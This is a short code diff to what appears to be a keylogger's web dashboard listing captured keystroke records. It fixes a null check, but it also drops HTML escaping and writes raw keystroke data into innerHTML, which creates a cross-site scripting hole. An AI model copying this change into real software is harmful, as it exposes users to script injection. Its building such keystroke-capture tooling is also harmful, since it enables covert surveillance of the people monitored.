@@ -701,14 +701,14 @@
       const filter = (document.getElementById('filter-keylogs')?.value || '').toLowerCase();
       const grid = document.getElementById('grid-keylogs');
       grid.innerHTML = records.keylogs
-        .filter(k => (k.data).toLowerCase().includes(filter))
+        .filter(k => (k.data || '').toLowerCase().includes(filter))
         .map(k => `
           <div class="event-card type-keylog">
             <div class="event-header">
               <span style="color: var(--red); font-weight: 800;">⌨️ KEYSTROKE LOG</span>
               <span>${k.timestamp}</span>
             </div>
-            <div class="event-body">${escapeHtml(k.data)}</div>
+            <div class="event-body" style="white-space: pre-wrap;">${k.data}</div>
           </div>
         `).join('') || '<div style="color: var(--muted);">Няма клавишни логове.</div>';
     }
